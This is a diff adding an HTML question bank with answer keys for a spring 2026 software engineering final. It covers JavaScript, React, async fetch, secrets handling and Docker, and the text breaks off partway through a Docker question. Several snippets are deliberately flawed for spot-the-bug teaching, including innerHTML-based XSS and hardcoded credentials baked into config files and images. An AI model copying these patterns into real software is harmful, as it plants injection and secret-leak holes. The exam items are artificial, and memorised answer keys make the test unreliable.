@@ -1,0 +1,1004 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset='utf-8'>
+<title>Final Exam — Question Bank</title>
+<style>
+@page { size: letter; margin: 0.7in 0.8in 0.7in 0.8in; }
+body { font-family: -apple-system, "Helvetica Neue", Helvetica, Arial, sans-serif;
+       font-size: 11pt; line-height: 1.45; color: #111; }
+h1 { font-size: 22pt; margin: 0 0 0.1em 0; border-bottom: 2px solid #333; padding-bottom: 0.25em; }
+.subtitle { font-size: 12pt; color: #555; margin: 0.2em 0 1.2em 0; }
+h2 { font-size: 12pt; text-transform: uppercase; letter-spacing: 0.04em; color: #333;
+     margin: 1.3em 0 0.4em 0; }
+h3 { font-size: 11pt; margin: 1.1em 0 0.3em 0; text-transform: uppercase;
+     letter-spacing: 0.04em; color: #333; }
+code { font-family: "SF Mono", "Menlo", "Monaco", monospace; font-size: 9.6pt;
+       background: #f1f1f4; padding: 0.06em 0.3em; border-radius: 3px; }
+pre { background: #f1f1f4; padding: 0.55em 0.8em; border-radius: 4px;
+      font-family: "SF Mono", "Menlo", "Monaco", monospace; font-size: 9.0pt;
+      line-height: 1.38; white-space: pre-wrap; overflow-wrap: break-word; margin: 0.5em 0; }
+table { width: 100%; border-collapse: collapse; margin: 0.8em 0; font-size: 9.8pt; }
+td, th { padding: 0.35em 0.6em; border: 1px solid #ddd; vertical-align: top; text-align: left; }
+th { background: #fafafa; }
+.meta-table td:first-child { font-weight: bold; background: #fafafa; width: 26%; }
+ol, ul { margin: 0.4em 0 0.5em 1.1em; padding-left: 0.7em; }
+ol > li, ul > li { margin-bottom: 0.35em; }
+.question { page-break-before: always; }
+.q-header { display: flex; justify-content: space-between; align-items: baseline;
+            border-bottom: 1px solid #333; padding-bottom: 0.3em; margin-bottom: 0.6em; }
+.q-id { font-size: 14pt; font-weight: bold; }
+.q-meta { font-size: 9.5pt; color: #555; text-align: right; }
+.answer { margin-top: 1.1em; background: #eef6ee; border: 1px solid #cfe6cf;
+          border-radius: 5px; padding: 0.5em 0.9em 0.2em 0.9em; }
+.answer-label { display: inline-block; background: #cfe6cf; color: #1f4d1f;
+                font-size: 8.5pt; text-transform: uppercase; letter-spacing: 0.05em;
+                padding: 0.1em 0.5em; border-radius: 3px; margin-bottom: 0.3em; }
+.answer p, .answer ol, .answer ul { font-size: 10pt; }
+.legend td:first-child { font-weight: bold; white-space: nowrap; }
+.name-field { float: right; font-size: 10.5pt; margin-top: 0.2em; }
+.name-field .blank { display: inline-block; border-bottom: 1px solid #333; width: 2.4in; height: 1em; }
+.lines { margin-top: 1em; }
+</style>
+</head>
+<body>
+
+<h1>Final Exam — Question Bank</h1>
+<p class="subtitle">Software Engineering — UATX — Spring 2026</p>
+<p>Working bank of <b>49 questions</b> spanning lectures 5.1 through 10.1. From it we
+draw two parallel seven-question papers: a <b>Sample Exam</b> (released for practice, with a
+key) and the real <b>Final</b>, same shape, different questions.</p>
+<p><b>How these questions are built.</b> The class codes with agents, so every question tests a
+skill the agent cannot do for the student: reading code and predicting behavior, finding bugs by
+inspection, writing the spec and decisions you would hand the agent (in prose, not syntax),
+judging which of two implementations is better, and making design calls under uncertainty.
+Nothing here rewards recalling syntax an agent would type for you. The shaded key on each page is
+for selection, not part of the student paper.</p>
+
+<h2>Topics</h2>
+<table class='legend'><tr><th>Topic</th><th>Lecture</th><th>Qs</th><th>Tests</th></tr><tr><td>T1 — JavaScript & TypeScript</td><td>5.1</td><td>4</td><td>reading transforms, DOM/event code, pure-vs-mutating</td></tr><tr><td>T2 — Async, fetch & races</td><td>5.2</td><td>4</td><td>async behavior, the three failure types, out-of-order requests</td></tr><tr><td>T3 — React: components & rendering</td><td>6.1</td><td>5</td><td>purity, JSX behavior, keys, what to spec vs leave to the agent</td></tr><tr><td>T4 — React state & effects</td><td>7.1</td><td>6</td><td>state snapshots, effect deps / stale closures, loading-error-data</td></tr><tr><td>T5 — Deployment, auth & secrets</td><td>7.2</td><td>4</td><td>the auth contract, ownership rule, secrets, env differences</td></tr><tr><td>T6 — Docker</td><td>8.1</td><td>4</td><td>image layers/caching, what ships in an image, run-time wiring</td></tr><tr><td>T7 — CI/CD with GitHub Actions</td><td>8.2</td><td>5</td><td>the fresh-VM model, secrets in CI, commit/PR hygiene</td></tr><tr><td>T8 — Concurrency</td><td>9.1</td><td>7</td><td>lost-update races, shared state, transactions as locks</td></tr><tr><td>T9 — Web security basics</td><td>9.2</td><td>6</td><td>injection, XSS, the broken-access-control family, audits</td></tr><tr><td>T10 — Building an agent</td><td>10.1</td><td>4</td><td>the loop & messages state, the tool round-trip, tool safety</td></tr></table>
+
+<h2>Proposed blueprint (7 questions)</h2>
+<p>Keeps all five midterm categories and adds a second trace and a second spot-the-bug, with
+JS/React guaranteed in at least two slots.</p>
+<table><tr><th>Slot</th><th>Type</th><th>Draws</th><th>JS/React</th></tr><tr><td>Q1</td><td>Trace-through</td><td>read code, predict behavior</td><td></td></tr><tr><td>Q2</td><td>Trace-through</td><td>second trace (JS/React or concurrency)</td><td>JS/React</td></tr><tr><td>Q3</td><td>Spot the bug</td><td>agent output, multi-defect</td><td>JS/React</td></tr><tr><td>Q4</td><td>Spot the bug</td><td>security endpoint</td><td></td></tr><tr><td>Q5</td><td>Specification</td><td>contract + decisions, in prose</td><td></td></tr><tr><td>Q6</td><td>Code review</td><td>judge two implementations</td><td></td></tr><tr><td>Q7</td><td>Short design</td><td>a design call under uncertainty</td><td></td></tr></table>
+
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T1-Q1</span><span class="q-meta">T1 — JavaScript & TypeScript (5.1)<br>Trace-through</span></div>
+  <p>The script runs to completion. Give the value printed at A, B, C, and D.</p>
+<pre>const todos = [
+  { id: 1, title: &quot;read notes&quot;,   done: true,  priority: 2 },
+  { id: 2, title: &quot;write fetch&quot;,  done: false, priority: 1 },
+  { id: 3, title: &quot;pick up milk&quot;, done: false, priority: 3 },
+  { id: 4, title: &quot;call the vet&quot;, done: true,  priority: 1 },
+];
+
+const a = todos.filter(t =&gt; !t.done).map(t =&gt; t.title);
+console.log(&quot;A:&quot;, a);                                          // ___
+
+const b = todos.filter(t =&gt; t.done).length;
+console.log(&quot;B:&quot;, b);                                          // ___
+
+const c = todos.filter(t =&gt; !t.done).reduce((s, t) =&gt; s + t.priority, 0);
+console.log(&quot;C:&quot;, c);                                          // ___
+
+console.log(&quot;D:&quot;, 1 === &quot;1&quot;, 0 == false, null === undefined);  // ___</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>A: <code>[&quot;write fetch&quot;, &quot;pick up milk&quot;]</code>.  B: <code>2</code>.  C: <code>4</code> (priorities 1 + 3 of the two pending todos).</p>
+<p>D: <code>false true false</code>. <code>===</code> does no coercion so <code>1 === &quot;1&quot;</code> is false; <code>==</code> coerces, so <code>0 == false</code> is true; <code>null === undefined</code> is false (only loose <code>==</code> makes those two equal).</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T1-Q2</span><span class="q-meta">T1 — JavaScript & TypeScript (5.1)<br>Spot the bug</span></div>
+  <p>Your agent wrote this to display the pending todos, newest first, in the page&#x27;s <code>&lt;ul id=&quot;todo-list&quot;&gt;</code>. It runs and shows todos. It has at least three defects -- one corrupts data, one is a safety hole, one is a correctness nit. For each: one sentence on what goes wrong and one on the fix.</p>
+<pre>// todos came from the server: { id, title, done, priority }
+function renderPending(todos) {
+  const list = document.querySelector(&quot;#todo-list&quot;);
+  const pending = todos.sort((a, b) =&gt; b.id - a.id)
+                       .filter(t =&gt; t.done == false);
+  list.innerHTML = &quot;&quot;;
+  for (const t of pending) {
+    list.innerHTML += &quot;&lt;li&gt;&quot; + t.title + &quot;&lt;/li&gt;&quot;;
+  }
+}</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <ol><li><code>todos.sort(...)</code> sorts in place, so it permanently reorders the caller&#x27;s array (the source data everyone else holds). Sort a copy: <code>[...todos].sort(...)</code>.</li><li><code>list.innerHTML += &quot;&lt;li&gt;&quot; + t.title</code> injects <code>title</code> as HTML, so a title containing markup breaks the list or runs script (the XSS pattern). Build the <code>&lt;li&gt;</code> with <code>createElement</code> + <code>textContent</code> and <code>append</code> it.</li><li><code>t.done == false</code> is loose equality; the class rule is strict. Use <code>!t.done</code> (or <code>t.done === false</code>).</li></ol>
+<p>Bonus: rebuilding <code>innerHTML</code> every loop iteration re-parses the whole list each time.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T1-Q3</span><span class="q-meta">T1 — JavaScript & TypeScript (5.1)<br>Code review</span></div>
+  <p>Two implementations of <code>doneTitles(todos)</code>. Both are meant to return a new array of the uppercased titles of the done todos, leaving the input array untouched. Pick one. Justify in three to five sentences, and call out anything that is actually broken in either version.</p>
+<pre>// Version A
+function doneTitles(todos) {
+  const out = [];
+  for (const t of todos) {
+    if (t.done) {
+      t.title = t.title.toUpperCase();
+      out.push(t.title);
+    }
+  }
+  return out;
+}
+
+// Version B
+function doneTitles(todos) {
+  return todos
+    .filter(t =&gt; t.done)
+    .map(t =&gt; t.title.toUpperCase());
+}</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>B is correct. A is broken: <code>t.title = t.title.toUpperCase()</code> mutates each done todo inside the caller&#x27;s array, so the original data is changed -- the spec said leave the input untouched. B reads cleanly, never mutates, and the <code>.filter().map()</code> chain states intent directly.</p>
+<p>Defending A only works if you also fix the mutation (push <code>t.title.toUpperCase()</code> without reassigning <code>t.title</code>). Full marks require naming the mutation as the real bug, not just preferring B&#x27;s style.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T2-Q1</span><span class="q-meta">T2 — Async, fetch & races (5.2)<br>Spot the bug</span></div>
+  <p>Your agent produced this submit handler to POST a new message and show it. It works when you click slowly on a good connection. Find at least three defects; for each, one sentence on what goes wrong and one on the fix.</p>
+<pre>const form  = document.querySelector(&quot;#new&quot;)  as HTMLFormElement;
+const input = document.querySelector(&quot;#text&quot;) as HTMLInputElement;
+const list  = document.querySelector(&quot;#list&quot;) as HTMLUListElement;
+
+form.addEventListener(&quot;submit&quot;, async (event) =&gt; {
+  const response = await fetch(&quot;/api/messages&quot;, {
+    method: &quot;POST&quot;,
+    body: { text: input.value },
+  });
+  const created = await response.json();
+  const li = document.createElement(&quot;li&quot;);
+  li.textContent = input.value;
+  list.append(li);
+});</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <ol><li>No <code>event.preventDefault()</code>. The form submits and reloads the page, discarding the async work. Call it first.</li><li><code>body</code> is a raw object. It must be <code>JSON.stringify({ text: input.value })</code> plus a <code>headers: { &quot;Content-Type&quot;: &quot;application/json&quot; }</code>, or the server cannot read it.</li><li>No <code>response.ok</code> check. <code>fetch</code> does not throw on 4xx/5xx, so a rejected POST still appends an item. Guard with <code>if (!response.ok) throw ...</code> inside a try/catch.</li></ol>
+<p>Bonus: it renders <code>input.value</code> instead of <code>created.text</code>, so it shows the raw input rather than the server&#x27;s stored version (id, trimming, normalization).</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T2-Q2</span><span class="q-meta">T2 — Async, fetch & races (5.2)<br>Trace-through</span></div>
+  <p>For each scenario, say which path runs: the <code>if (!response.ok) throw</code>, the <code>catch</code>, or neither (returns data).</p>
+<pre>async function load(): Promise&lt;Message[]&gt; {
+  try {
+    const response = await fetch(&quot;/api/messages&quot;);
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    return await response.json();
+  } catch (err) {
+    console.error(err);
+    return [];
+  }
+}</pre>
+<ul><li>(a) Server returns 200 with valid JSON.</li><li>(b) Server returns 500.</li><li>(c) The wifi is off and fetch cannot reach the server.</li><li>(d) Server returns 200 but the body is <code>&lt;html&gt;...</code> (not JSON).</li></ul>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <ul><li>(a) Neither -- returns the data.</li><li>(b) The <code>if (!response.ok) throw</code> fires, then <code>catch</code> returns <code>[]</code>.</li><li>(c) The fetch promise rejects, so <code>catch</code> returns <code>[]</code> (the <code>if</code> never runs).</li><li>(d) <code>response.json()</code> throws while parsing, so <code>catch</code> returns <code>[]</code>.</li></ul>
+<p>Only the HTTP-error case needs the manual <code>.ok</code> check; network failure and bad JSON throw on their own.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T2-Q3</span><span class="q-meta">T2 — Async, fetch & races (5.2)<br>Short design</span></div>
+  <p>A search box calls <code>loadFiltered(filter)</code> on every keystroke; each call does <code>await fetch(&#x27;/api/messages?filter=&#x27; + filter)</code> then <code>renderMessages(data)</code>. A user types &quot;cat&quot; quickly. Sometimes the list ends up showing results for &quot;ca&quot; instead of &quot;cat&quot;.</p>
+<ol><li>In a sentence or two, explain how that happens even though each individual fetch is correct.</li><li>Identify the tool from class that fixes it, and describe the shape of the fix (what you keep, what you do at the start of each call).</li><li>Name one step in the fix that is easy to forget, and what breaks without it.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. The requests resolve out of order. The &quot;ca&quot; request can return after the &quot;cat&quot; request, so its later <code>renderMessages</code> overwrites the newer results, leaving the list showing whichever response arrived last rather than the most recently typed query.</p>
+<p>2. <code>AbortController</code>. Keep one controller in scope; at the top of each call, abort the previous one and create a fresh <code>AbortController</code>, passing its <code>signal</code> to fetch so a superseded request is cancelled.</p>
+<p>3. Ignoring the <code>AbortError</code> in the catch. Without that check, every cancelled request looks like a real failure and surfaces an error.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T3-Q1</span><span class="q-meta">T3 — React: components & rendering (6.1)<br>Spot the bug</span></div>
+  <p>Your agent wrote this to render a chat newest-first. It renders. It has at least three problems -- a React-purity bug, a list-identity bug, and a missing state. For each: one sentence on what goes wrong and one on the fix.</p>
+<pre>function MessageList({ messages }) {
+  messages.sort((a, b) =&gt; b.id - a.id);
+  return (
+    &lt;ul&gt;
+      {messages.map((m, i) =&gt; (
+        &lt;li key={i}&gt;{m.author}: {m.text}&lt;/li&gt;
+      ))}
+    &lt;/ul&gt;
+  );
+}</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <ol><li><code>messages.sort(...)</code> mutates the prop array during render. A component must be a pure function of its props; mutating them can corrupt the parent&#x27;s state. Sort a copy: <code>[...messages].sort(...)</code>.</li><li><code>key={i}</code> uses the array index. When the list reorders or an item is inserted, React mis-associates rows (and their state). Use a stable id: <code>key={m.id}</code>.</li><li>There is no empty state -- zero messages renders a bare <code>&lt;ul&gt;</code>. Add <code>{messages.length === 0 &amp;&amp; &lt;p&gt;No messages yet&lt;/p&gt;}</code>.</li></ol>
+<p>Note <code>{m.text}</code> itself is fine -- JSX escapes it, so it is not an XSS hole the way <code>innerHTML</code> would be.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T3-Q2</span><span class="q-meta">T3 — React: components & rendering (6.1)<br>Trace-through</span></div>
+  <p>Describe the visible output for two cases: (i) <code>todos = []</code>, and (ii) <code>todos = [{ id: 1, title: &quot;a&quot;, done: true }]</code>.</p>
+<pre>function TodoList({ todos }) {
+  return (
+    &lt;div&gt;
+      {todos.length === 0 &amp;&amp; &lt;p&gt;No todos yet!&lt;/p&gt;}
+      &lt;ul&gt;
+        {todos.map((t) =&gt; (
+          &lt;li key={t.id} className={t.done ? &quot;done&quot; : &quot;&quot;}&gt;
+            {t.done ? &quot;[x] &quot; : &quot;[ ] &quot;}{t.title}
+          &lt;/li&gt;
+        ))}
+      &lt;/ul&gt;
+    &lt;/div&gt;
+  );
+}</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>(i) Empty: shows <code>No todos yet!</code> (the <code>&amp;&amp;</code> left side is true so the <code>&lt;p&gt;</code> renders), followed by an empty <code>&lt;ul&gt;</code>.</p>
+<p>(ii) One done todo: no <code>&lt;p&gt;</code> (the <code>&amp;&amp;</code> is false), and the <code>&lt;ul&gt;</code> holds one <code>&lt;li class=&quot;done&quot;&gt;</code> reading <code>[x] a</code>.</p>
+<p>Key idea: <code>&amp;&amp;</code> renders the element when the left side is truthy and nothing when falsy; the ternary picks the prefix and the class.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T3-Q3</span><span class="q-meta">T3 — React: components & rendering (6.1)<br>Specification</span></div>
+  <p>You are about to hand an agent the job of building a <code>&lt;MessageThread&gt;</code> component that loads the messages for a given <code>threadId</code> and lets the user post a new one. Do not write any code. Write the spec:</p>
+<ol><li>What pieces of state/data the component needs, and where each comes from.</li><li>The display states it must handle -- name them.</li><li>One behavior that is easy to get wrong here, that you would call out to the agent explicitly.</li><li>One product decision that is ambiguous, and the call you would make.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. The list of messages (from <code>GET /api/messages?thread=threadId</code>), a loading flag, an error value, and the draft text in the input. The messages depend on <code>threadId</code>.</p>
+<p>2. Loading, error, empty, and loaded -- four states the UI must render distinctly.</p>
+<p>3. Re-fetch when <code>threadId</code> changes (the effect must depend on <code>threadId</code>, or it shows the old thread -- the stale-closure trap); and append the server&#x27;s returned message, not the raw input text.</p>
+<p>4. Ambiguity, e.g.: does posting optimistically append before the server confirms, or wait for the response? Does a successful post refetch the whole thread or append one row? State the call you would make. Any reasonable decision earns marks; the point is naming a real ambiguity.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T3-Q4</span><span class="q-meta">T3 — React: components & rendering (6.1)<br>Specification</span></div>
+  <p>Feature request to your agent: &quot;As the user types in the search box, show matching products.&quot; The agent&#x27;s first cut is below, and it works in a quick demo. Before you let it ship, write the spec you would hand back. Do not write code.</p>
+<pre>function ProductSearch() {
+  const [results, setResults] = useState([]);
+  const [query, setQuery] = useState(&quot;&quot;);
+  useEffect(() =&gt; {
+    fetch(`/api/products?q=${query}`)
+      .then(r =&gt; r.json())
+      .then(setResults);
+  }, [query]);
+  return (
+    &lt;div&gt;
+      &lt;input value={query} onChange={e =&gt; setQuery(e.target.value)} /&gt;
+      &lt;ul&gt;{results.map(p =&gt; &lt;li key={p.id}&gt;{p.name} (${p.price})&lt;/li&gt;)}&lt;/ul&gt;
+    &lt;/div&gt;
+  );
+}</pre>
+<ol><li>The display states this UI must handle -- name them.</li><li>Two behaviors it is currently missing or getting wrong (look hard at a fast typist on a flaky network).</li><li>One product decision that is ambiguous, and the call you would make.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Loading, error, empty (&quot;no matches&quot;), and results -- plus the initial state, where an empty query currently fires a fetch for everything.</p>
+<p>2. Any two: no <code>response.ok</code> / error handling, so a failed request silently shows nothing; out-of-order responses (the 5.2 race) -- type &quot;cat&quot; fast and the slower &quot;ca&quot; response can land last and overwrite the newer results, so superseded requests should be cancelled/ignored (AbortController); a fetch on every keystroke hammering the API (wants debounce); an empty query probably should not fetch at all.</p>
+<p>3. A real ambiguity, e.g.: does an empty box show all products, nothing, or recent/popular? Is there a minimum query length? State your call.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T4-Q1</span><span class="q-meta">T4 — React state & effects (7.1)<br>Trace-through</span></div>
+  <p>A student clicks the button once, starting from 0. What number shows afterward, and why in one sentence? What one change would make it show 2?</p>
+<pre>function DoubleClicker() {
+  const [count, setCount] = useState(0);
+  function bump() {
+    setCount(count + 1);
+    setCount(count + 1);
+  }
+  return &lt;button onClick={bump}&gt;{count}&lt;/button&gt;;
+}</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>Shows <code>1</code>. <code>count</code> was 0 in this render&#x27;s snapshot, so both calls are <code>setCount(0 + 1)</code> -- two writes of the same value, and React stores 1.</p>
+<p>To get 2, use the functional updater both times: <code>setCount(c =&gt; c + 1)</code>, which applies to the latest queued value rather than the frozen snapshot.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T4-Q2</span><span class="q-meta">T4 — React state & effects (7.1)<br>Code review</span></div>
+  <p>Two versions of a profile component, identical except for the last line of the effect. The user navigates from <code>/users/123</code> to <code>/users/456</code>, so the <code>userId</code> prop changes. One keeps showing 123&#x27;s data. Which version is correct, why does the other one break, and what is the general name for that bug?</p>
+<pre>// Version A
+function UserProfile({ userId }) {
+  const [user, setUser] = useState(null);
+  useEffect(() =&gt; {
+    fetch(`/api/user/${userId}`).then(r =&gt; r.json()).then(setUser);
+  }, []);
+  return &lt;div&gt;{user?.name}&lt;/div&gt;;
+}
+
+// Version B  -- last line is:   }, [userId]);</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>B is correct. A&#x27;s effect has an empty deps array, so it runs once on mount and captures the first <code>userId</code> (123); when the prop changes, React never re-runs the effect, so the stale result stays on screen. B depends on <code>userId</code>, so the effect re-fetches whenever it changes.</p>
+<p>This is the stale-closure / missing-dependency bug -- the most common <code>useEffect</code> mistake. Good answers note the empty array is exactly right for a one-time-on-mount fetch, and wrong the moment the effect reads a value that can change.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T4-Q3</span><span class="q-meta">T4 — React state & effects (7.1)<br>Spot the bug</span></div>
+  <p>This agent-written component should fetch and show messages with loading and error states. Find at least three defects; one sentence each on what goes wrong and the fix.</p>
+<pre>function Messages() {
+  const [messages, setMessages] = useState([]);
+  const [loading, setLoading] = useState(false);
+  useEffect(() =&gt; {
+    async function load() {
+      const r = await fetch(&quot;/api/messages&quot;);
+      setMessages(await r.json());
+      setLoading(false);
+    }
+    load();
+  });
+  if (loading) return &lt;p&gt;Loading...&lt;/p&gt;;
+  return &lt;ul&gt;{messages.map(m =&gt; &lt;li&gt;{m.text}&lt;/li&gt;)}&lt;/ul&gt;;
+}</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <ol><li><code>loading</code> starts <code>false</code>, so the loading branch never shows during the first fetch. Initialize <code>useState(true)</code>.</li><li>No deps array on <code>useEffect</code>, so it runs after every render; setting state re-renders, which refetches -- an infinite loop hammering the API. Add <code>, []</code>.</li><li>No <code>response.ok</code> check and no try/catch, so there is no error state and a failure leaves <code>loading</code> stuck. Wrap in try/catch/finally with an <code>error</code> state.</li></ol>
+<p>Bonus: the mapped <code>&lt;li&gt;</code> is missing <code>key={m.id}</code>.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T5-Q1</span><span class="q-meta">T5 — Deployment, auth & secrets (7.2)<br>Specification</span></div>
+  <p>You are adding <code>GET /api/me/posts</code> (the logged-in user&#x27;s posts) to the BBS API. Auth is a Supabase JWT sent as a bearer token. Do not write code. Specify:</p>
+<ol><li>In words, how the endpoint establishes who is calling.</li><li>The one rule that guarantees user A can never see user B&#x27;s posts, and where that rule lives.</li><li>The status codes for: success, a missing or invalid token, and a logged-in user who has no posts.</li><li>One thing you would want nailed down before handing this to the agent.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Verify the bearer token&#x27;s signature and read the user id out of the verified token&#x27;s claims. Identity comes from the token, never from anything the client puts in the URL or body.</p>
+<p>2. The database query filters posts by the authenticated user&#x27;s id in the WHERE clause -- ownership lives in the query, not in a trusted request field. This is the IDOR defense from 9.2.</p>
+<p>3. 200 for success; 401 for a missing, invalid, or expired token; 200 with an empty list for a user who simply has no posts (not 404).</p>
+<p>4. A real ambiguity, e.g.: pagination and ordering, or whether &quot;my posts&quot; includes drafts / soft-deleted posts. Naming one and making a call earns the marks.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T5-Q2</span><span class="q-meta">T5 — Deployment, auth & secrets (7.2)<br>Spot the bug</span></div>
+  <p>A team is about to deploy. Find three things wrong with this setup; one sentence each on what and the fix.</p>
+<pre># config.py  (committed to the repo)
+DATABASE_URL = &quot;postgresql://postgres:hunter2@db.supabase.co:5432/postgres&quot;
+JWT_SECRET   = &quot;super-secret-signing-key-abc123&quot;
+
+# .gitignore is empty
+# the React build is served by Vercel; the API runs on Railway</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <ol><li>Real secrets are hardcoded and committed -- now in git history forever. Move to env vars from a gitignored <code>.env</code> locally and the platform dashboard in prod, and rotate them since they leaked.</li><li><code>.gitignore</code> does not list <code>.env</code> (or <code>config.py</code>). Add it before the next commit.</li><li>Serving the frontend on Vercel while the API is on Railway puts them on different origins, reintroducing the CORS the single-service architecture avoids. Serve the built frontend from the API.</li></ol></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T5-Q4</span><span class="q-meta">T5 — Deployment, auth & secrets (7.2)<br>Short design</span></div>
+  <p>Your app reads <code>DATABASE_URL</code> and <code>JWT_SECRET</code> from environment variables; locally they live in a gitignored <code>.env</code>. You are deploying to Railway for the first time. Answer all three:</p>
+<ol><li>Where do these two values go in production, and why not in the repo?</li><li>You realize you committed <code>.env</code> last week, before adding it to <code>.gitignore</code>. You remove it in a new commit. Is that enough? Why or why not, and what do you actually do?</li><li>Your frontend also needs to talk to your backend. Name one kind of value it is safe to ship in the browser bundle and one that must never leave the server, and the rule that decides.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Into the platform&#x27;s config (Railway dashboard env vars), injected at runtime. Not in the repo because anything committed is readable by everyone with repo access and stays in git history forever.</p>
+<p>2. Not enough. The secret is already in the git history (and every clone/fork), so a later deletion commit does not remove it from history. Treat it as leaked: rotate the secret (new DB password / JWT signing secret) and update the dashboard value; scrubbing history is unreliable once it has been pushed.</p>
+<p>3. Safe in the browser: things meant to be public, e.g. the API base URL or a publishable/anon key. Must stay server-side: the JWT signing secret, a service-role key, the DB password. The rule: if the browser can see it, the whole world can, so only values meant to be public may ship to the client.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T6-Q1</span><span class="q-meta">T6 — Docker (8.1)<br>Trace-through</span></div>
+  <p>You edit one line in <code>app.py</code> and run <code>docker build</code> again. Which numbered layers rebuild, and why?</p>
+<pre>[1] FROM python:3.14
+[2] WORKDIR /app
+[3] COPY requirements.txt .
+[4] RUN pip install -r requirements.txt
+[5] COPY . .
+[6] CMD [&quot;uvicorn&quot;, &quot;app:app&quot;, &quot;--host&quot;, &quot;0.0.0.0&quot;, &quot;--port&quot;, &quot;8000&quot;]</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>Layers [5] and [6] rebuild.</p>
+<p>Caching is top-down: [1]-[4] are reused because <code>requirements.txt</code> did not change. [5] (<code>COPY . .</code>) now sees a changed file, so it rebuilds, and every layer after a rebuilt one rebuilds too -- hence [6]. Copying deps before code is exactly what keeps [3]/[4] cached on a code edit.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T6-Q2</span><span class="q-meta">T6 — Docker (8.1)<br>Spot the bug</span></div>
+  <p>A teammate builds this image and <code>docker push</code>es it to a registry so you can pull it. The project dir holds <code>app.py</code>, <code>requirements.txt</code>, <code>Dockerfile</code>, and a <code>.env</code> with <code>DATABASE_URL</code> and <code>JWT_SECRET</code>. What did they just publish, and what is the fix?</p>
+<pre>FROM python:3.14
+WORKDIR /app
+COPY requirements.txt .
+RUN pip install -r requirements.txt
+COPY . .
+CMD [&quot;uvicorn&quot;, &quot;app:app&quot;, &quot;--host&quot;, &quot;0.0.0.0&quot;, &quot;--port&quot;, &quot;8000&quot;]</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p><code>COPY . .</code> copies the whole directory including <code>.env</code>, so the real secrets are baked into an image layer that anyone who pulls the image can read.</p>
+<p>Fix: add a <code>.dockerignore</code> listing <code>.env</code> (and <code>.git</code>, <code>__pycache__</code>), and inject secrets at run time (<code>-e</code> / <code>--env-file</code> / the dashboard). Rotate the secrets, since the pushed image leaked them.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T6-Q3</span><span class="q-meta">T6 — Docker (8.1)<br>Spot the bug</span></div>
+  <p>The container is clearly running but the browser cannot reach it. One sentence on the bug, one on the fix.</p>
+<pre>$ docker run chat-app
+INFO:     Uvicorn running on http://0.0.0.0:8000
+$ docker ps
+# ... PORTS column is empty
+$ curl localhost:8000
+curl: (7) Connection refused</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>The <code>docker run</code> is missing the port publish, so the container&#x27;s port 8000 is not mapped to the host and nothing on localhost reaches it.</p>
+<p>Fix: <code>docker run -p 8000:8000 chat-app</code>. The &quot;uvicorn bound to the wrong address&quot; distractor is ruled out -- it is already on <code>0.0.0.0</code>.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T6-Q4</span><span class="q-meta">T6 — Docker (8.1)<br>Short design</span></div>
+  <p>Your agent generated this Dockerfile for the FastAPI service. It is the team&#x27;s deploy image: pushed to a shared registry (GitHub Container Registry) that teammates and the deploy server pull from, and rebuilt on every push to <code>main</code>. The project directory also contains a <code>.env</code> with more secrets, and there is no <code>.dockerignore</code>.</p>
+<pre>FROM python:3.14
+WORKDIR /app
+
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+
+COPY . .
+
+# image-processing system library the app shells out to
+RUN apt-get update &amp;&amp; apt-get install -y imagemagick
+
+ENV JWT_SECRET=&quot;prod-signing-key-7f3a9c2b&quot;
+ENV DATABASE_URL=&quot;postgresql://app:s3cr3t@db.internal:5432/app&quot;
+
+CMD uvicorn app:app --host 0.0.0.0 --port $PORT</pre>
